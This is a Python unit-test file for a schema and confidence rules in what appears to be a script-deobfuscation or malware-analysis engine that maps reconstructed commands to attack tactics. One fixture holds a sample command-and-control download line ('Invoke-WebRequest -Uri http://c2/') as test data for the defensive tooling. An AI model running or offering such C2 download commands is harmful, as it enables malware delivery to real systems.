"""Unit tests · ExecGraph schema + confidence propagation (30 tests)."""
import json

import pytest
from pydantic import ValidationError

from engine.exec_graph import (
    SCHEMA_VERSION,
    Behavior,
    ExecGraph,
    ExecNode,
    NodeKind,
    SideEffect,
    SideEffectVerb,
    TacticKind,
)


# ---------------------------------------------------------------------------
# ExecNode basics (10)
# ---------------------------------------------------------------------------
def test_execnode_defaults():
    n = ExecNode(kind=NodeKind.decode)
    assert n.confidence == 100
    assert n.inputs == ()
    assert n.outputs == ()
    assert n.origin == "deterministic"
    assert n.schema_version == 1
    assert n.notes == ()


def test_execnode_id_prefix():
    assert ExecNode(kind=NodeKind.decode).id.startswith("n_")


def test_execnode_ids_unique():
    ids = {ExecNode(kind=NodeKind.decode).id for _ in range(50)}
    assert len(ids) == 50


def test_execnode_extra_fields_forbidden():
    with pytest.raises(ValidationError):
        ExecNode(kind=NodeKind.decode, bogus="oops")  # type: ignore[call-arg]


def test_execnode_kind_is_required():
    with pytest.raises(ValidationError):
        ExecNode()  # type: ignore[call-arg]


def test_execnode_reconstructed_defaults_empty():
    assert ExecNode(kind=NodeKind.decode).reconstructed == ""


def test_execnode_args_is_dict():
    n = ExecNode(kind=NodeKind.var_bind, args={"name": "X", "value": "1"})
    assert n.args == {"name": "X", "value": "1"}


def test_execnode_side_effects_is_tuple():
    se = SideEffect(verb=SideEffectVerb.var_bind, node_id="n_x")
    n = ExecNode(kind=NodeKind.var_bind, side_effects=(se,))
    assert isinstance(n.side_effects, tuple)


def test_execnode_json_roundtrip():
    n = ExecNode(
        kind=NodeKind.process,
        inputs=("n_1",),
        args={"image": "notepad.exe"},
        reconstructed="start notepad.exe",
        confidence=80,
        parser="cmd",
    )
    back = ExecNode.model_validate_json(n.model_dump_json())
    assert back == n


def test_execnode_schema_version_must_equal_constant():
    # attempting to construct with a different version fails validation
    with pytest.raises(ValidationError):
        ExecNode(kind=NodeKind.decode, schema_version=99)


# ---------------------------------------------------------------------------
# ExecGraph append-only semantics (8)
# ---------------------------------------------------------------------------
def test_execgraph_empty():
    g = ExecGraph()
    assert g.nodes == ()
    assert g.node_ids() == []
    assert g.dangling_refs() == []


def test_execgraph_add_single_node():
    n = ExecNode(kind=NodeKind.decode)
    g = ExecGraph().add_node(n)
    assert g.node_ids() == [n.id]


def test_execgraph_add_multiple_nodes_returns_new_graph_each_time():
    g = ExecGraph()
    g1 = g.add_node(ExecNode(kind=NodeKind.decode))
    g2 = g1.add_node(ExecNode(kind=NodeKind.normalize))
    assert len(g.nodes) == 0
    assert len(g1.nodes) == 1
    assert len(g2.nodes) == 2


def test_execgraph_find_returns_node():
    n = ExecNode(kind=NodeKind.decode)
    g = ExecGraph().add_node(n)
    assert g.find(n.id) == n
    assert g.find("does-not-exist") is None


def test_execgraph_by_kind():
    n1 = ExecNode(kind=NodeKind.decode)
    n2 = ExecNode(kind=NodeKind.decode)
    n3 = ExecNode(kind=NodeKind.process)
    g = ExecGraph().add_node(n1).add_node(n2).add_node(n3)
    assert len(g.by_kind(NodeKind.decode)) == 2
    assert len(g.by_kind(NodeKind.process)) == 1


def test_execgraph_add_node_rejects_unknown_parent():
    child = ExecNode(kind=NodeKind.string_op, inputs=("n_missing",))
    with pytest.raises(ValueError, match="unknown parent"):
        ExecGraph().add_node(child)


def test_execgraph_json_roundtrip():
    p = ExecNode(kind=NodeKind.decode, confidence=80)
    g = ExecGraph().add_node(p).add_node(
        ExecNode(kind=NodeKind.string_op, inputs=(p.id,), confidence=80),
    )
    back = ExecGraph.model_validate_json(g.model_dump_json())
    assert back == g


def test_execgraph_all_side_effects_aggregates():
    n = ExecNode(
        kind=NodeKind.file,
        side_effects=(
            SideEffect(verb=SideEffectVerb.create_file, node_id="n_x"),
            SideEffect(verb=SideEffectVerb.write_file, node_id="n_x"),
        ),
    )
    g = ExecGraph().add_node(n)
    assert len(g.all_side_effects()) == 2


# ---------------------------------------------------------------------------
# Confidence propagation (5) — deep tests live in invariants/
# ---------------------------------------------------------------------------
def test_conf_valid_range():
    ExecNode(kind=NodeKind.decode, confidence=0)
    ExecNode(kind=NodeKind.decode, confidence=100)


def test_conf_zero_ok_when_no_parents():
    n = ExecNode(kind=NodeKind.decode, confidence=0)
    ExecGraph().add_node(n)


def test_child_conf_equal_to_min_parent_ok():
    p = ExecNode(kind=NodeKind.decode, confidence=50)
    g = ExecGraph().add_node(p)
    g.add_node(ExecNode(kind=NodeKind.string_op, inputs=(p.id,), confidence=50))


def test_child_conf_below_min_parent_ok():
    p = ExecNode(kind=NodeKind.decode, confidence=50)
    g = ExecGraph().add_node(p)
    g.add_node(ExecNode(kind=NodeKind.string_op, inputs=(p.id,), confidence=25))


def test_unresolved_and_multi_parent_min_rule():
    p1 = ExecNode(kind=NodeKind.decode, confidence=80)
    p2 = ExecNode(kind=NodeKind.unresolved, confidence=40)
    g = ExecGraph().add_node(p1).add_node(p2)
    # min = 40, unresolved penalty = -20 → allowed max 20
    g.add_node(ExecNode(kind=NodeKind.string_op, inputs=(p1.id, p2.id), confidence=20))
    with pytest.raises(ValueError):
        g.add_node(ExecNode(kind=NodeKind.string_op, inputs=(p1.id, p2.id), confidence=21))


# ---------------------------------------------------------------------------
# Behavior (4)
# ---------------------------------------------------------------------------
def test_behavior_construction():
    b = Behavior(
        tactic=TacticKind.execution,
        evidence_nodes=("n_1",),
        reconstructed="cmd /c echo hi",
        confidence=90,
    )
    assert b.id.startswith("b_")
    assert b.tactic == TacticKind.execution


def test_behavior_is_frozen():
    b = Behavior(
        tactic=TacticKind.execution,
        evidence_nodes=("n_1",),
        reconstructed="x",
        confidence=90,
    )
    with pytest.raises(ValidationError):
        b.confidence = 10  # type: ignore[misc]


def test_behavior_confidence_range():
    with pytest.raises(ValidationError):
        Behavior(
            tactic=TacticKind.execution,
            evidence_nodes=("n_1",),
            reconstructed="x",
            confidence=150,
        )


def test_behavior_json_roundtrip():
    b = Behavior(
        tactic=TacticKind.command_and_control,
        sub_kind="download",
        evidence_nodes=("n_1", "n_2"),
        reconstructed="Invoke-WebRequest -Uri http://c2/",
        confidence=75,
        parameters={"url": "http://c2/"},
    )
    back = Behavior.model_validate_json(b.model_dump_json())
    assert back == b


# ---------------------------------------------------------------------------
# Enum size / stability (3)
# ---------------------------------------------------------------------------
def test_node_kind_count_locked():
    assert len(list(NodeKind)) == 39


def test_side_effect_verb_count_locked():
    assert len(list(SideEffectVerb)) == 37


def test_tactic_count_locked():
    # 14 top-level + 7 supporting = 21
    assert len(list(TacticKind)) == 21
